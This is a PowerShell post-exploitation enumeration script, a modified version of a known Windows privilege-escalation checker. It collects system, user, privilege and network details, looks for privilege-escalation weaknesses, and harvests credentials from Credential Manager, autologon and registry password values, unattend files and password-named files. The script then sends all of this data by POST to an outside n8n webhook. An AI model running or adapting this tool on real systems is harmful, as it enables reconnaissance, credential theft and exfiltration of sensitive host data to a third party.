# Windows Enumeration Script v 0.3
# Modified with webhook integration and enhanced error handling
# Enhanced by Adityaminz18

param($extended)

$lines = "------------------------------------------"

function whost($a) {
    Write-Host
    Write-Host -ForegroundColor Green $lines
    Write-Host -ForegroundColor Green " $a"
    Write-Host -ForegroundColor Green $lines
}

whost "Windows Enumeration Script v 0.3
          by absolomb
       www.sploitspren.com
       Modified with webhook integration"

# Initialize output capture - MUST be at script level
$script:outputCapture = @()
$script:errorCount = 0
$script:successCount = 0

function Get-EnumOutput {
    param($title, $command)
    
    whost $title
    
    # Append to script-level variable
    $script:outputCapture += "`n`n========================================`n"
    $script:outputCapture += "=== $title ===`n"
    $script:outputCapture += "========================================`n"
    
    try {
        # Execute command and capture output
        $result = Invoke-Expression $command 2>&1 | Out-String
        
        if ($result -and $result.Trim() -ne "") {
            Write-Host $result
            $script:outputCapture += $result
            $script:successCount++
        } else {
            $noDataMsg = "[No data returned or command produced no output]"
            Write-Host $noDataMsg -ForegroundColor Yellow
            $script:outputCapture += "$noDataMsg`n"
            $script:successCount++
        }
    } catch {
        $errorMsg = "[ERROR] Failed to execute command: $($_.Exception.Message)"
        Write-Host $errorMsg -ForegroundColor Red
        $script:outputCapture += "$errorMsg`n"
        $script:errorCount++
    }
}

$standard_commands = [ordered]@{
    'Basic System Information'                    = 'systeminfo';
    'Environment Variables'                       = 'Get-ChildItem Env: | Format-Table Key,Value -AutoSize | Out-String';
    'Network Information'                         = 'Get-NetIPConfiguration | Format-Table InterfaceAlias,InterfaceDescription,IPv4Address -AutoSize | Out-String';
    'DNS Servers'                                 = 'Get-DnsClientServerAddress -AddressFamily IPv4 | Format-Table -AutoSize | Out-String';
    'ARP Cache'                                   = 'Get-NetNeighbor -AddressFamily IPv4 -ErrorAction SilentlyContinue | Format-Table ifIndex,IPAddress,LinkLayerAddress,State -AutoSize | Out-String';
    'Routing Table'                               = 'Get-NetRoute -AddressFamily IPv4 | Select-Object -First 20 | Format-Table DestinationPrefix,NextHop,RouteMetric,ifIndex -AutoSize | Out-String';
    'Network Connections'                         = 'netstat -ano';
    'Connected Drives'                            = 'Get-PSDrive | Where-Object {$_.Provider -like "*FileSystem*"} | Format-Table Name,Root,Used,Free -AutoSize | Out-String';
    'Firewall Configuration'                      = 'netsh advfirewall show allprofiles';
    'Current User'                                = 'Write-Output "$env:USERDOMAIN\$env:USERNAME"';
    'User Privileges'                             = 'whoami /priv';
    'User Groups'                                 = 'whoami /groups';
    'Local Users'                                 = 'Get-LocalUser -ErrorAction SilentlyContinue | Format-Table Name,Enabled,LastLogon,PasswordLastSet -AutoSize | Out-String';
    'Logged in Users'                             = 'qwinsta 2>&1';
    'Credential Manager'                          = 'cmdkey /list';
    'User Autologon Registry Items'               = 'Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" -ErrorAction SilentlyContinue | Select-Object Default* | Format-List | Out-String';
    'Local Groups'                                = 'Get-LocalGroup -ErrorAction SilentlyContinue | Format-Table Name,Description -AutoSize | Out-String';
    'Local Administrators'                        = 'Get-LocalGroupMember Administrators -ErrorAction SilentlyContinue | Format-Table Name,PrincipalSource -AutoSize | Out-String';
    'User Directories'                            = 'Get-ChildItem C:\Users -ErrorAction SilentlyContinue | Format-Table Name,LastWriteTime -AutoSize | Out-String';
    'Searching for SAM Backup Files'              = '$sam1 = Test-Path "$env:SYSTEMROOT\repair\SAM"; $sam2 = Test-Path "$env:SYSTEMROOT\system32\config\regback\SAM"; Write-Output "SAM in repair: $sam1`nSAM in regback: $sam2"';
    'Running Processes'                           = 'Get-Process | Where-Object {$_.Name -notlike "svchost*"} | Select-Object -First 50 Name,Id,@{Name="User";Expression={(Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).GetOwner().User}} | Format-Table -AutoSize | Out-String';
    'Installed Software Directories'              = 'Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" -ErrorAction SilentlyContinue | Select-Object -First 30 | Format-Table Name,LastWriteTime -AutoSize | Out-String';
    'Software in Registry'                        = 'Get-ChildItem -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE -ErrorAction SilentlyContinue | Select-Object -First 30 | Format-Table Name -AutoSize | Out-String';
    'Folders with Everyone Permissions'           = '$folders = Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" -Directory -ErrorAction SilentlyContinue | Select-Object -First 50; $result = @(); foreach($f in $folders) { try { $acl = Get-Acl $f.FullName -ErrorAction SilentlyContinue; if($acl.Access.IdentityReference -match "Everyone") { $result += $f.FullName } } catch {} }; if($result.Count -gt 0) { $result | Out-String } else { Write-Output "[No folders with Everyone permissions found]" }';
    'Folders with BUILTIN\Users Permissions'      = '$folders = Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" -Directory -ErrorAction SilentlyContinue | Select-Object -First 50; $result = @(); foreach($f in $folders) { try { $acl = Get-Acl $f.FullName -ErrorAction SilentlyContinue; if($acl.Access.IdentityReference -match "BUILTIN\\\\Users") { $result += $f.FullName } } catch {} }; if($result.Count -gt 0) { $result | Out-String } else { Write-Output "[No folders with BUILTIN\Users permissions found]" }';
    'Checking AlwaysInstallElevated (HKCU)'       = '$hkcu = Test-Path "Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer"; Write-Output "HKCU AlwaysInstallElevated: $hkcu"';
    'Checking AlwaysInstallElevated (HKLM)'       = '$hklm = Test-Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer"; Write-Output "HKLM AlwaysInstallElevated: $hklm"';
    'Unquoted Service Paths'                      = 'Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -notmatch ''^".*"$'' -and $_.PathName -notlike "C:\Windows\*"} | Select-Object Name,DisplayName,PathName,StartMode | Format-Table -AutoSize | Out-String';
    'Scheduled Tasks'                             = 'Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Select-Object -First 30 | Format-Table TaskName,TaskPath,State -AutoSize | Out-String';
    'Tasks Folder'                                = 'Get-ChildItem C:\Windows\Tasks -ErrorAction SilentlyContinue | Format-Table -AutoSize | Out-String';
    'Startup Commands'                            = 'Get-CimInstance Win32_StartupCommand -ErrorAction SilentlyContinue | Select-Object Name,Command,Location,User | Format-List | Out-String';
}

$extended_commands = [ordered]@{
    'Searching for Unattend and Sysprep Files'   = 'Get-ChildItem -Path C:\Windows\Panther -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | Select-Object FullName,LastWriteTime | Format-Table -AutoSize | Out-String';
    'Searching for web.config Files'             = 'Get-ChildItem -Path C:\inetpub -Include web.config -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20 FullName,LastWriteTime | Format-Table -AutoSize | Out-String';
    'Searching for Password/Credential Files'    = 'Get-ChildItem -Path C:\Users -Include *password*,*cred*,*vnc* -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20 FullName,LastWriteTime | Format-Table -AutoSize | Out-String';
    'Searching for Config Files'                 = 'Get-ChildItem -Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20 FullName,LastWriteTime | Format-Table -AutoSize | Out-String';
    'Searching Registry for Passwords (HKLM)'    = 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword 2>$null';
    'Searching Registry for Passwords (HKCU)'    = 'reg query "HKCU\Software" /f password /t REG_SZ /s 2>$null | Select-Object -First 50';
}

Write-Host "`n"
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "  Starting Windows Security Enumeration Scan" -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "  Hostname: $env:COMPUTERNAME" -ForegroundColor White
Write-Host "  User: $env:USERDOMAIN\$env:USERNAME" -ForegroundColor White
Write-Host "  Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor White
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "`n"

# Run standard commands
Write-Host "[*] Running standard enumeration checks..." -ForegroundColor Yellow
ForEach ($command in $standard_commands.GetEnumerator()) {
    Get-EnumOutput -title $command.Name -command $command.Value
}

# Run extended commands if specified
if ($extended -and $extended.ToLower() -eq 'extended') {
    Write-Host "`n[*] Running extended enumeration checks (this may take several minutes)..." -ForegroundColor Yellow
    ForEach ($command in $extended_commands.GetEnumerator()) {
        Get-EnumOutput -title $command.Name -command $command.Value
    }
}

# Summary
Write-Host "`n"
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "  Enumeration Summary" -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "  Successful Checks: $script:successCount" -ForegroundColor Green
Write-Host "  Failed Checks: $script:errorCount" -ForegroundColor Red
Write-Host "  Total Data Collected: $($script:outputCapture.Length) characters" -ForegroundColor White
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "`n"

whost "Sending results to security analysis service..."

# Prepare data for webhook
$hostname = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
$enumDataString = $script:outputCapture -join "`n"

$webhookData = @{
    hostname = $hostname
    timestamp = $timestamp
    enumData = $enumDataString
    metadata = @{
        user = "$env:USERDOMAIN\$env:USERNAME"
        osVersion = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        scanType = if ($extended) { "Extended" } else { "Standard" }
        successfulChecks = $script:successCount
        failedChecks = $script:errorCount
        dataSize = $enumDataString.Length
    }
}

$body = $webhookData | ConvertTo-Json -Depth 10 -Compress

# Send to n8n webhook
$webhookUrl = "https://n8n.immunefile.com/webhook/windows-enum"

Write-Host "[*] Webhook URL: $webhookUrl" -ForegroundColor Cyan
Write-Host "[*] Payload Size: $($body.Length) bytes" -ForegroundColor Cyan
Write-Host "[*] Sending data..." -ForegroundColor Yellow

try {
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -TimeoutSec 300 -ErrorAction Stop
    
    whost "Data sent successfully!"
    Write-Host ""
    Write-Host "Server Response:" -ForegroundColor Green
    Write-Host "----------------------------------------" -ForegroundColor Green
    
    if ($response) {
        Write-Host ($response | ConvertTo-Json -Depth 10) -ForegroundColor White
        
        # Save response to file
        $responseFile = "webhook-response-$(Get-Date -Format 'yyyyMMdd-HHmmss').json"
        $response | ConvertTo-Json -Depth 10 | Out-File -FilePath $responseFile -Encoding UTF8
        Write-Host ""
    Write-Host "Response saved to: $responseFile" -ForegroundColor Cyan
    }
    
    Write-Host "----------------------------------------" -ForegroundColor Green
    
} catch {
    Write-Host ""
    Write-Host "ERROR: Failed to send data to webhook" -ForegroundColor Red
    Write-Host "----------------------------------------" -ForegroundColor Red
    Write-Host "Error Type: $($_.Exception.GetType().FullName)" -ForegroundColor Yellow
    Write-Host "Error Message: $($_.Exception.Message)" -ForegroundColor Yellow
    
    # Show detailed error if available
    if ($_.ErrorDetails.Message) {
        Write-Host "Error Details: $($_.ErrorDetails.Message)" -ForegroundColor Yellow
    }
    
    Write-Host "----------------------------------------" -ForegroundColor Red
    Write-Host ""
    Write-Host "Troubleshooting Steps:" -ForegroundColor Cyan
    Write-Host "  1. Verify the webhook URL is correct" -ForegroundColor White
    Write-Host "  2. Ensure n8n workflow is activated" -ForegroundColor White
    Write-Host "  3. Check network connectivity" -ForegroundColor White
    Write-Host "  4. Verify firewall/proxy settings" -ForegroundColor White
    Write-Host "  5. Check if payload size exceeds server limits" -ForegroundColor White
    Write-Host ""
    Write-Host "Saving output locally instead..." -ForegroundColor Yellow
    
    # Create temp directory if it doesn't exist
    $tempDir = "C:\temp"
    if (-not (Test-Path $tempDir)) {
        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    }
    
    $outputFile = "$tempDir\enum_output_$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
    $script:outputCapture | Out-File -FilePath $outputFile -Encoding UTF8
    
    Write-Host "Output saved to: $outputFile" -ForegroundColor Green
    
    # Also save the JSON payload
    $jsonFile = "$tempDir\enum_payload_$(Get-Date -Format 'yyyyMMdd-HHmmss').json"
    $body | Out-File -FilePath $jsonFile -Encoding UTF8
    Write-Host "JSON payload saved to: $jsonFile" -ForegroundColor Green
}

Write-Host ""
whost "Script finished!"
Write-Host ""
Write-Host "Quick Summary:" -ForegroundColor Cyan
Write-Host "  - Hostname: $hostname" -ForegroundColor White
Write-Host "  - Scan Type: $(if ($extended) { 'Extended' } else { 'Standard' })" -ForegroundColor White
Write-Host "  - Timestamp: $timestamp" -ForegroundColor White
Write-Host "  - Checks Run: $($script:successCount + $script:errorCount)" -ForegroundColor White
$sizeKB = [math]::Round($enumDataString.Length / 1024, 2)
Write-Host ("  - Data Collected: {0} KB" -f $sizeKB) -ForegroundColor White
Write-Host ""